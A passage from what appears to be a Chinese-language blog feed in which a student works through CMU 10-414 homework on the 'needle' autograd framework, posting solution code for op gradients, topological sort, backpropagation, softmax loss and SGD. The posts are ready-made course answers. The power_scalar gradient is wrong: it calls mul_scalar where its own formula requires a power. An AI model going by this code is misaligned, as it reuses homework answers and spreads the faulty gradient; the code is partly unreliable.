那就是将减号前面和减号后面的分开计算，然后统一相减后求平均值</p><p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/image-20231024171353873.png" alt="image-20231024171353873"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">softmax_loss</span><span class="hljs-params">(Z, y_one_hot)</span>:</span><br><span class="hljs-function">    # BEGIN YOUR SOLUTION</span><br><span class="hljs-function">    e_z =</span> ndl.<span class="hljs-built_in">exp</span>(Z)<br>    e_s = ndl.<span class="hljs-built_in">summation</span>(e_z, (<span class="hljs-number">1</span>,))<br>    e_l = ndl.<span class="hljs-built_in">log</span>(e_s)<br>    e_s = ndl.<span class="hljs-built_in">summation</span>(e_l)<br>    <span class="hljs-comment">// 通过矩阵相乘，将one_hot向量变成对应的值</span><br>    y_s = ndl.<span class="hljs-built_in">summation</span>(y_one_hot * Z)<br>    <span class="hljs-built_in">return</span> (e_s - y_s) / Z.shape[<span class="hljs-number">0</span>]<br>    # END YOUR SOLUTION<br></code></pre></td></tr></table></figure><h1 id="两层神经网络的SGD"><a href="#两层神经网络的SGD" class="headerlink" title="两层神经网络的SGD"></a>两层神经网络的SGD</h1><ol><li>第一步，增加relu函数</li></ol><p>前向计算比较简单</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">compute</span><span class="hljs-params">(self, a)</span>:</span><br><span class="hljs-function">    return array_api.maximum(<span class="hljs-number">0</span>, a)</span><br></code></pre></td></tr></table></figure><p>反向传播的时候，原来小于0的部分梯度为0，不用更新，所以只需要更新原来大于0的部分，这部分函数是$relu(x)&#x3D;x$，所以导数还是1</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">gradient</span><span class="hljs-params">(self, out_grad, node)</span>:</span><br><span class="hljs-function">    # BEGIN YOUR SOLUTION</span><br><span class="hljs-function">    data =</span> node.<span class="hljs-built_in">realize_cached_data</span>().<span class="hljs-built_in">copy</span>()<br>    data[data &gt; <span class="hljs-number">0</span>] = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">multiply</span>(out_grad, <span class="hljs-built_in">Tensor</span>(data))<br></code></pre></td></tr></table></figure><ol start="2"><li>第二步，完成sgd</li></ol><p>基本的流程和hw0基本一致，但是有几个注意点</p><ol><li>这里的X和y是numpy类型，使用时要先转为Tensor</li><li>反向传播是从最后一个结点开始的，这里就是loss</li><li>更改参数直接操作W1和W2里面cached_data就可以完成</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">nn_epoch</span><span class="hljs-params">(X, y, W1, W2, lr=<span class="hljs-number">0.1</span>, batch=<span class="hljs-number">100</span>)</span>:    </span><br><span class="hljs-function">batch_num =</span> X.shape[<span class="hljs-number">0</span>] <span class="hljs-comment">// batch</span><br>    Y = <span class="hljs-built_in">gethot</span>(y, W2.shape[<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(batch_num):<br>        x_d = ndl.<span class="hljs-built_in">Tensor</span>(X[i * batch:(i + <span class="hljs-number">1</span>) * batch])<br>        y_d = ndl.<span class="hljs-built_in">Tensor</span>(Y[i * batch:(i + <span class="hljs-number">1</span>) * batch])<br>        x_w1 = ndl.<span class="hljs-built_in">matmul</span>(x_d, W1)<br>        th_x_w1 = ndl.<span class="hljs-built_in">relu</span>(x_w1)<br>        o = ndl.<span class="hljs-built_in">matmul</span>(th_x_w1, W2)<br>        loss = <span class="hljs-built_in">softmax_loss</span>(o, y_d)<br>        loss.<span class="hljs-built_in">backward</span>()<br>        W1 = ndl.<span class="hljs-built_in">Tensor</span>(W1.<span class="hljs-built_in">realize_cached_data</span>() - lr *<br>                        W1.grad.<span class="hljs-built_in">realize_cached_data</span>())<br>        W2 = ndl.<span class="hljs-built_in">Tensor</span>(W2.<span class="hljs-built_in">realize_cached_data</span>() - lr *<br>                        W2.grad.<span class="hljs-built_in">realize_cached_data</span>())<br>    <span class="hljs-keyword">return</span> W1, W2<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>深度学习框架</category>
      
      <category>CMU10414</category>
      
    </categories>
    
    
    <tags>
      
      <tag>深度学习框架</tag>
      
      <tag>CMU10414</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cmu10414_lab2</title>
    <link href="/2023/11/02/cmu10414-lab2/"/>
    <url>/2023/11/02/cmu10414-lab2/</url>
    
    <content type="html"><![CDATA[<h1 id="Introduction-to-needle"><a href="#Introduction-to-needle" class="headerlink" title="Introduction to needle"></a>Introduction to <code>needle</code></h1><p>两个重要的问题</p><ol><li><code>python/needle/autograd.py</code>，定义了框架，包括但不限于以下部分<ol><li>class Op</li><li>class TensorOp(Op)</li><li>class Value</li><li>class Tensor(Value)</li><li>compute_gradient_of_variables</li></ol></li><li><code>python/needle/ops/ops_mathematic.py</code>，包含多种操作的实现</li></ol><p>推荐先熟悉以下类，其他的没那么重要</p><ol><li><p>Value</p></li><li><p>Op</p><p> 关键在于两个函数</p><p> compute()会计算输出</p><p> gradient()会根据输出的梯度，求出输入的梯度（反向传播）</p></li><li><p>Tensor</p></li><li><p>TensorOp</p></li></ol><h1 id="实现forward操作"><a href="#实现forward操作" class="headerlink" title="实现forward操作"></a>实现forward操作</h1><p>很多操作就是一行numpy函数解决，但是最后一个需要自己再处理一下逻辑</p><p>在numpy中，转置维度必须将所有维度包括了，加入维度是5，那么输入的axes的长度一定是五，然后把要交换的两个维度交换位置，比如这里就是将2和4对应的维度交换，[0,1,4,3,2]</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">compute</span><span class="hljs-params">(self, a)</span>:</span><br><span class="hljs-function">    d =</span> a.ndim<br>    axis = [i <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(d)]<br>    x, y = (d - <span class="hljs-number">1</span>, d - <span class="hljs-number">2</span>) <span class="hljs-keyword">if</span> self.axes is None        <span class="hljs-built_in">else</span>(self.axes[<span class="hljs-number">0</span>], self.axes[<span class="hljs-number">1</span>])<br>    axis[x], axis[y] = axis[y], axis[x]<br>    <span class="hljs-keyword">return</span> array_api.<span class="hljs-built_in">transpose</span>(a, axes=axis)<br></code></pre></td></tr></table></figure><h1 id="实现backward计算"><a href="#实现backward计算" class="headerlink" title="实现backward计算"></a>实现backward计算</h1><h2 id="power-scalar"><a href="#power-scalar" class="headerlink" title="power_scalar"></a>power_scalar</h2><p>$$<br>y&#x3D;x^a\<br>\frac{dy}{dx}&#x3D;ax^{a-1}<br>$$</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">gradient</span><span class="hljs-params">(self, out_grad, node)</span>:</span><br><span class="hljs-function">    # BEGIN YOUR SOLUTION</span><br><span class="hljs-function">    return out_grad * self.scalar * mul_scalar(node.inputs[<span class="hljs-number">0</span>], self.scalar - <span class="hljs-number">1</span>)</span><br></code></pre></td></tr></table></figure><h2 id="divide"><a href="#divide" class="headerlink" title="divide"></a>divide</h2><p>$$<br>y&#x3D;\frac{a}{b}\<br>\frac{dy}{da}&#x3D;\frac{1}{b}\<br>\frac{dy}{db}&#x3D;-\frac{a}{b^2}<br>$$</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">gradient</span><span class="hljs-params">(self, out_grad, node)</span>:</span><br><span class="hljs-function">    # BEGIN YOUR SOLUTION</span><br><span class="hljs-function">    a_d =</span> <span class="hljs-built_in">divide</span>(out_grad, node.inputs[<span class="hljs-number">1</span>])<br>    b_d = <span class="hljs-built_in">negate</span>(<span class="hljs-built_in">multiply</span>(out_grad, <span class="hljs-built_in">divide</span>(<br>        node.inputs[<span class="hljs-number">0</span>], <span class="hljs-built_in">multiply</span>(node.inputs[<span class="hljs-number">1</span>], node.inputs[<span class="hljs-number">1</span>]))))<br>    <span class="hljs-keyword">return</span> a_d, b_d<br>    # END YOUR SOLUTION<br></code></pre></td></tr></table></figure><h2 id="divide-scalar"><a href="#divide-scalar" class="headerlink" title="divide_scalar"></a>divide_scalar</h2><p>标量操作很简单</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">gradient</span><span class="hljs-params">(self, out_grad, node)</span>:</span><br><span class="hljs-function">    # BEGIN YOUR SOLUTION</span><br><span class="hljs-function">    return out_grad / self.scalar</span><br></code></pre></td></tr></table></figure><h2 id="matmul"><a href="#matmul" class="headerlink" title="matmul"></a>matmul</h2><p>这个操作就有点恶心了，特别是两个相乘的矩阵存在高纬（超过两维的情况）</p><p>高维矩阵相乘，本质上是多个二维矩阵相乘，它们除了最后两个维度要能够相乘外，前面的维度必须完全相同，比如一个四维矩阵A[a,b,c,d]和一个三维矩阵[e,f,g]可以相乘的条件就是[c,d]和[f,g]要能够相乘，并且b要等于e</p><p>而求导，也就是将前面维度全部求和，比如C&#x3D;AB，其中A的维度是[a,b,c,d]，B的维度是[d,e]，C的维度就是[a,b,c,e]</p><ol><li>现在损失对A求导的结果的形状肯定也是[a,b,c,d]，这个维度很容易通过C的梯度的形状[a,b,c,e]和B的形状[d,e]凑出来</li><li>而损失函数对B求导的形状肯定是[d,e]，但是这个不能直接由C的梯度[a,b,c,e]和A的梯度[a,b,c,d]凑出来，因为多了前面两维[a,b]，将这两维给除去的方法，就是将对应位置给加起来，通过numpy.sum(0,1)就可以达到这个效果。（为什么相加之后结果就是B的导数，就和矩阵求导相关了，我也不会证明）</li></ol><p>最后，对一个高维矩阵，比如[a,b,c,d]进行转置，好像只会将它转为[a,b,d,c]</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">gradient</span><span class="hljs-params">(self, out_grad, node)</span>:</span><br><span class="hljs-function">    # BEGIN YOUR SOLUTION</span><br><span class="hljs-function">    lhs, rhs =</span> node.inputs<br>    lgrad, rgrad = <span class="hljs-built_in">matmul</span>(out_grad, rhs.<span class="hljs-built_in">transpose</span>()), <span class="hljs-built_in">matmul</span>(<br>        lhs.<span class="hljs-built_in">transpose</span>(), out_grad)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(lhs.shape) &lt; <span class="hljs-built_in">len</span>(lgrad.shape):<br>        lgrad = lgrad.<span class="hljs-built_in">sum</span>(<br>            <span class="hljs-built_in">tuple</span>([i <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(lgrad.shape) - <span class="hljs-built_in">len</span>(lhs.shape))]))<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(rhs.shape) &lt; <span class="hljs-built_in">len</span>(rgrad.shape):<br>        rgrad = rgrad.<span class="hljs-built_in">sum</span>(<br>            <span class="hljs-built_in">tuple</span>([i <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(rgrad.shape) - <span class="hljs-built_in">len</span>(rhs.shape))]))<br>    <span class="hljs-keyword">return</span> lgrad, rgrad<br></code></pre></td></tr></table></figure><h2 id="reshape"><a href="#reshape" class="headerlink" title="reshape"></a>reshape</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">gradient</span><span class="hljs-params">(self, out_grad, node)</span>:</span><br><span class="hljs-function">    # BEGIN YOUR SOLUTION</span><br><span class="hljs-function">    return reshape(out_grad, node.inputs[<span class="hljs-number">0</span>].shape)</span><br><span class="hljs-function">    # END YOUR SOLUTION</span><br></code></pre></td></tr></table></figure><h2 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">gradient</span><span class="hljs-params">(self, out_grad, node)</span>:</span><br><span class="hljs-function">    # BEGIN YOUR SOLUTION</span><br><span class="hljs-function">    return negate(out_grad)</span><br></code></pre></td></tr></table></figure><h2 id="transpose"><a href="#transpose" class="headerlink" title="transpose"></a>transpose</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">gradient</span><span class="hljs-params">(self, out_grad, node)</span>:</span><br><span class="hljs-function">    # BEGIN YOUR SOLUTION</span><br><span class="hljs-function">    return transpose(out_grad, self.t)</span><br></code></pre></td></tr></table></figure><h2 id="broadcast"><a href="#broadcast" class="headerlink" title="broadcast"></a>broadcast</h2><ol><li>将变化的维度给找出来，比如原始数据是[3,5,1,4]，被广播成了[3,5,4,4]，那么要做的就是将第3维给找出来，也就是1-&gt;4的这一维，然后将这一维的梯度通过sum相加</li><li>最后还要reshape成原来的样子</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">gradient</span><span class="hljs-params">(self, out_grad, node)</span>:</span><br><span class="hljs-function">    # BEGIN YOUR SOLUTION</span><br><span class="hljs-function">    ori_shape =</span> node.inputs[<span class="hljs-number">0</span>].shape<br>    shrink_dims = [i <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(self.shape))]<br>    <span class="hljs-keyword">for</span> i, (ori, cur) in <span class="hljs-built_in">enumerate</span>(<span class="hljs-built_in">zip</span>(<span class="hljs-built_in">reversed</span>(ori_shape), <span class="hljs-built_in">reversed</span>(self.shape))):<br>        <span class="hljs-keyword">if</span> ori == cur:<br>            shrink_dims[<span class="hljs-built_in">len</span>(self.shape) - i - <span class="hljs-number">1</span>] = <span class="hljs-number">-1</span><br>    shrink_dims = <span class="hljs-built_in">tuple</span>(<span class="hljs-built_in">filter</span>(lambda x: x &gt;= <span class="hljs-number">0</span>, shrink_dims))<br>    <span class="hljs-keyword">return</span> out_grad.<span class="hljs-built_in">sum</span>(shrink_dims).<span class="hljs-built_in">reshape</span>(ori_shape)<br>    # END YOUR SOLUTION<br></code></pre></td></tr></table></figure><h2 id="summation"><a href="#summation" class="headerlink" title="summation"></a>summation</h2><p>summation是对维度进行了压缩，那么在反向传播时，肯定要将其进行广播</p><p>所以</p><ol><li>先找出哪些维度被压缩了</li><li>reshape成被压缩的形状（之前通过sum操作，可能直接将维度给干没了，所以要reshape恢复维度，即使那个维度的长度是1）</li><li>广播成输入的形状（为啥可以直接广播就是正确的梯度，和矩阵求导相关）</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">gradient</span><span class="hljs-params">(self, out_grad, node)</span>:</span><br><span class="hljs-function">    # BEGIN YOUR SOLUTION</span><br><span class="hljs-function">    new_shape =</span> <span class="hljs-built_in">list</span>(node.inputs[<span class="hljs-number">0</span>].shape)<br>    axes = <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(new_shape)) <span class="hljs-keyword">if</span> self.axes is None <span class="hljs-keyword">else</span> self.axes<br>    <span class="hljs-keyword">for</span> axis in axes:<br>        new_shape[axis] = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> out_grad.<span class="hljs-built_in">reshape</span>(new_shape).<span class="hljs-built_in">broadcast_to</span>(node.inputs[<span class="hljs-number">0</span>].shape)<br></code></pre></td></tr></table></figure><h1 id="拓扑排序"><a href="#拓扑排序" class="headerlink" title="拓扑排序"></a>拓扑排序</h1><p>这个部分感觉题意有点难理解，本质上很简单</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">find_topo_sort</span><span class="hljs-params">(node_list: List[Value])</span> -&gt; List[Value]:</span><br></code></pre></td></tr></table></figure><p>这个函数给出了一个node_list，这里面可能有多个node，输出以这个node为终点的拓扑排序（正拓扑排序）</p><blockquote><p>以目前我的理解，不太明白为什么是node_list，一般不就是用最后lost的函数的结点为终点找拓扑排序吗。</p><p>我看了一下测试的代码，也都是只用了一个节点，先留个坑</p></blockquote><p>下面这个函数给了一个dfs的模板</p><ol><li>第一个参数node代表当前遍历到了哪个结点</li><li>第二个参数visited代表已经有哪些结点被访问过了</li><li>第三个参数topo_order代表目前已经找到的拓扑排序，我们最后也就是要返回这个作为拓扑排序的答案</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">topo_sort_dfs</span><span class="hljs-params">(node, visited, topo_order)</span>:</span><br></code></pre></td></tr></table></figure><p>实现代码很简单，就是题意对我来说有一点晦涩，感觉和不太熟悉怎么用终点推出拓扑排序有关，菜狗</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">find_topo_sort</span><span class="hljs-params">(node_list: List[Value])</span> -&gt; List[Value]:</span><br><span class="hljs-function">    ans =</span> []<br>    vis = <span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">for</span> node in node_list:<br>        <span class="hljs-built_in">topo_sort_dfs</span>(node, vis, ans)<br>    <span class="hljs-keyword">return</span> ans<br>def <span class="hljs-built_in">topo_sort_dfs</span>(node, visited, topo_order):<br>    <span class="hljs-keyword">if</span> node in visited:<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">for</span> ne in node.inputs:<br>        <span class="hljs-built_in">topo_sort_dfs</span>(ne, visited, topo_order)<br>    visited.<span class="hljs-built_in">add</span>(node)<br>    topo_order.<span class="hljs-built_in">append</span>(node)<br></code></pre></td></tr></table></figure><h1 id="反向模式微分"><a href="#反向模式微分" class="headerlink" title="反向模式微分"></a>反向模式微分</h1><p>函数签名</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">compute_gradient_of_variables</span><span class="hljs-params">(output_tensor, out_grad)</span></span><br></code></pre></td></tr></table></figure><ol><li>第一个参数是最后输出的那个tensor</li><li>第二个参数是这个tensor的梯度</li></ol><p>函数内已有的变量</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">node_to_output_grads_list: Dict[Tensor, List[Tensor]] = &#123;&#125;<br></code></pre></td></tr></table></figure><p>这个字典表示，当前tensor对应的，所有输出tensor对它的偏导数</p><p>使用起来也很简单，只要将对应的偏导数全部相加，就是当前tensor的梯度</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">reverse_topo_order = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">reversed</span>(<span class="hljs-built_in">find_topo_sort</span>([output_tensor])))<br></code></pre></td></tr></table></figure><p>这就是反向的拓扑排序</p><p>实现思路基本就是下面这个图</p><p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/image-20231024161041846.png" alt="image-20231024161041846"></p><p>但是需要加入一些对当前框架的理解</p><ol><li>首先，这个函数的作用就是计算出每一个tensor对应的梯度，而通过上图也可以看到，我们在反向传播中是通过新建了一个tensor来保存梯度的。按照这个框架的意思，好像是将这个新建的tensor作为原来tensor的一个变量存入原来的tensor，这里可以用self.grad来存。感觉这个参数可以随便命名，可能后面的调用都是自己写</li><li>这里要用到之前写的各种op中的gradient函数了，可以通过<code>gradient_as_tuple</code>来调用。这个函数也正是生成了对输入的所有tensor对应的偏导数tensor，核心操作了属于是</li></ol><p>因此，实现思路</p><ol><li>按照反向拓扑排序的顺序来遍历所有tensor</li><li>根据<code>node_to_output_grads_list</code>对应的值，计算这个tensor的梯度，这里可以用框架提供的<code>sum_node_list</code>来计算梯度之和。然后将计算好的梯度存入当前node</li><li>如果当前tensor没有input结点，也就是op为None，直接continue</li><li>如果当前tensor有input结点<ol><li>先通过<code>gradient_as_tuple</code>取出这个tensor对所有input的偏导数tensor</li><li>然后将input和偏导数tensor一一对应的访问，加入字典<code>node_to_output_grads_list</code>中</li></ol></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">compute_gradient_of_variables</span><span class="hljs-params">(output_tensor, out_grad)</span>:</span><br><span class="hljs-function">    node_to_output_grads_list: Dict[Tensor, List[Tensor]] =</span> &#123;&#125;<br>    node_to_output_grads_list[output_tensor] = [out_grad]<br>    reverse_topo_order = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">reversed</span>(<span class="hljs-built_in">find_topo_sort</span>([output_tensor])))<br>    <span class="hljs-keyword">for</span> node in reverse_topo_order:<br>        grads = <span class="hljs-built_in">sum_node_list</span>(node_to_output_grads_list[node])<br>        node.grad = grads<br>        <span class="hljs-keyword">if</span> node.op is None:<br>            <span class="hljs-keyword">continue</span><br>        node_to_input_grad = node.op.<span class="hljs-built_in">gradient_as_tuple</span>(node.grad, node)<br>        <span class="hljs-keyword">for</span> input_node, input_grad in <span class="hljs-built_in">zip</span>(node.inputs, node_to_input_grad):<br>            <span class="hljs-keyword">if</span> input_node <span class="hljs-keyword">not</span> in node_to_output_grads_list:<br>                node_to_output_grads_list[input_node] = []<br> node_to_output_grads_list[input_node].<span class="hljs-built_in">append</span>(input_grad)<br></code></pre></td></tr></table></figure><h1 id="softmax-loss"><a href="#softmax-loss" class="headerlink" title="softmax loss"></a>softmax loss</h1><p>先实现两个op，要注意，在反向传播的过程中，要全程调用tensor的op，不能再用numpy的操作了</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">class</span> <span class="hljs-title">Log</span><span class="hljs-params">(TensorOp)</span>:</span><br><span class="hljs-function">    def compute(self, a):</span><br><span class="hljs-function">        return array_api.log(a)</span><br><span class="hljs-function">    def gradient(self, out_grad, node):</span><br><span class="hljs-function">        return divide(out_grad, node.inputs[<span class="hljs-number">0</span>])</span><br><span class="hljs-function">class Exp(TensorOp):</span><br><span class="hljs-function">    def compute(self, a):</span><br><span class="hljs-function">        return array_api.exp(a)</span><br><span class="hljs-function">    def gradient(self, out_grad, node):</span><br><span class="hljs-function">        return multiply(out_grad, exp(node.inputs[<span class="hljs-number">0</span>]))</span><br></code></pre></td></tr></table></figure><p>实现softmax，基本就是翻译hw0里的softmax_loss函数，这里用了比较巧的计算方法， 那就是将减号前面和减号后面的分开计算，然后统一相减后求平均值</p><p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/image-20231024171353873.png" alt="image-20231024171353873"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">softmax_loss</span><span class="hljs-params">(Z, y_one_hot)</span>:</span><br><span class="hljs-function">    # BEGIN YOUR SOLUTION</span><br><span class="hljs-function">    e_z =</span> ndl.<span class="hljs-built_in">exp</span>(Z)<br>    e_s = ndl.<span class="hljs-built_in">summation</span>(e_z, (<span class="hljs-number">1</span>,))<br>    e_l = ndl.<span class="hljs-built_in">log</span>(e_s)<br>    e_s = ndl.<span class="hljs-built_in">summation</span>(e_l)<br>    <span class="hljs-comment">// 通过矩阵相乘，将one_hot向量变成对应的值</span><br>    y_s = ndl.<span class="hljs-built_in">summation</span>(y_one_hot * Z)<br>    <span class="hljs-built_in">return</span> (e_s - y_s) / Z.shape[<span class="hljs-number">0</span>]<br>    # END YOUR SOLUTION<br></code></pre></td></tr></table></figure><h1 id="两层神经网络的SGD"><a href="#两层神经网络的SGD" class="headerlink" title="两层神经网络的SGD"></a>两层神经网络的SGD</h1><ol><li>第一步，增加relu函数</li></ol><p>前向计算比较简单</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">compute</span><span class="hljs-params">(self, a)</span>:</span><br><span class="hljs-function">    return array_api.maximum(<span class="hljs-number">0</span>, a)</span><br></code></pre></td></tr></table></figure><p>反向传播的时候，原来小于0的部分梯度为0，不用更新，所以只需要更新原来大于0的部分，这部分函数是$relu(x)&#x3D;x$，所以导数还是1</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">gradient</span><span class="hljs-params">(self, out_grad, node)</span>:</span><br><span class="hljs-function">    # BEGIN YOUR SOLUTION</span><br><span class="hljs-function">    data =</span> node.<span class="hljs-built_in">realize_cached_data</span>().<span class="hljs-built_in">copy</span>()<br>    data[data &gt; <span class="hljs-number">0</span>] = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">multiply</span>(out_grad, <span class="hljs-built_in">Tensor</span>(data))<br></code></pre></td></tr></table></figure><ol start="2"><li>第二步，完成sgd</li></ol><p>基本的流程和hw0基本一致，但是有几个注意点</p><ol><li>这里的X和y是numpy类型，使用时要先转为Tensor</li><li>反向传播是从最后一个结点开始的，这里就是loss</li><li>更改参数直接操作W1和W2里面cached_data就可以完成</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">nn_epoch</span><span class="hljs-params">(X, y, W1, W2, lr=<span class="hljs-number">0.1</span>, batch=<span class="hljs-number">100</span>)</span>:    </span><br><span class="hljs-function">batch_num =</span> X.shape[<span class="hljs-number">0</span>] <span class="hljs-comment">// batch</span><br>    Y = <span class="hljs-built_in">gethot</span>(y, W2.shape[<span 